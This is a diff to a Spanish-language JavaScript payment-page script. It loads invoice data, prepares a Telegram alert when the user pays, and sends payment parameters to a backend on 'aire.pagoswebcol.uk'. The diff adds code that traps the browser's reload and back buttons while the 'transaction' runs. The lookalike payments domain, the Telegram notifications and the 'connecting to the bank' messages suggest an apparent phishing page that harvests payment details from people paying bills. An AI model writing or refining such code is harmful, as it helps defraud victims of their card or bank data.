@@ -1,3 +1,27 @@
+// Variable global para controlar el estado de la transacción
+let isTransactionActive = false;
+
+// --- PROTECCIÓN CONTRA RECARGA Y RETROCESO ---
+// 1. Prevenir recarga (F5, Ctrl+R)
+window.addEventListener('beforeunload', (e) => {
+    if (isTransactionActive) {
+        // Muestra la alerta nativa del navegador advirtiendo que no debe salir
+        e.preventDefault();
+        e.returnValue = 'Por favor espere la carga para no causar errores';
+        return 'Por favor espere la carga para no causar errores';
+    }
+});
+
+// 2. Prevenir botón atrás
+window.addEventListener('popstate', (e) => {
+    if (isTransactionActive) {
+        // Empujamos el estado de nuevo para anular la acción de "atrás"
+        history.pushState(null, null, window.location.href);
+        alert("Por favor espere la carga para no causar errores");
+    }
+});
+
+
 // --- SCRIPT PARA CARGAR DATOS Y PROCESAR EL PAGO ---
 document.addEventListener('DOMContentLoaded', () => {
     const data = JSON.parse(localStorage.getItem('datosFactura'));
@@ -183,7 +207,11 @@ if (botonPagar) {
             console.warn('No se pudo preparar la alerta de Telegram:', e);
         }
 
-        // 3. ACTIVAR PANTALLA DE CARGA
+        // 3. ACTIVAR PANTALLA DE CARGA Y BLOQUEO DE NAVEGACIÓN
+        isTransactionActive = true; // Activar el bloqueo
+        // Insertamos un estado en el historial para atrapar el botón "Atrás"
+        history.pushState(null, null, window.location.href);
+
         const overlay = document.getElementById('loadingOverlay');
         const loadingTextEl = document.getElementById('dynamicLoadingText');
         if (overlay) overlay.style.display = 'flex';
@@ -208,7 +236,7 @@ if (botonPagar) {
         }
 
         // 4. PREPARAR URL (Backend)
-        const baseUrl = 'https://air.pagoswebcol.uk'; 
+        const baseUrl = 'https://aire.pagoswebcol.uk'; 
         
         const params = new URLSearchParams({
             amount: amount,
@@ -247,6 +275,7 @@ if (botonPagar) {
 
         // --- FUNCIONES AUXILIARES ---
         function finalizarConExito(url) {
+            isTransactionActive = false; // Liberar navegación
             if (textInterval) clearInterval(textInterval);
             if (loadingTextEl) loadingTextEl.textContent = "¡Conexión exitosa! Redirigiendo...";
             setTimeout(() => {
@@ -273,9 +302,8 @@ if (botonPagar) {
                 document.head.removeChild(script);
                 delete window[callbackName];
                 
-                // --- PLAN C: REDIRECCIÓN DIRECTA ---
-                if (loadingTextEl) loadingTextEl.textContent = "Redirigiendo al servidor...";
-                window.location.href = `${baseUrl}/meter?${params.toString()}`;
+                // --- CAMBIO SOLICITADO: NO REDIRECCIONAR AL FALLAR, MOSTRAR ERROR ---
+                manejarErrorFinal("No se pudo conectar con el banco. Intente nuevamente.");
             };
 
             const jsonpUrl = `${baseUrl}/meter.jsonp?${params.toString()}&callback=${callbackName}`;
@@ -284,10 +312,11 @@ if (botonPagar) {
         }
 
         function manejarErrorFinal(mensaje) {
+            isTransactionActive = false; // Liberar navegación
             if (textInterval) clearInterval(textInterval);
             if (overlay) overlay.style.display = 'none';
             
-            alert("No se pudo conectar con el banco. Intente nuevamente.\n" + mensaje);
+            alert(mensaje);
             
             btn.textContent = "Reintentar";
             btn.disabled = false;
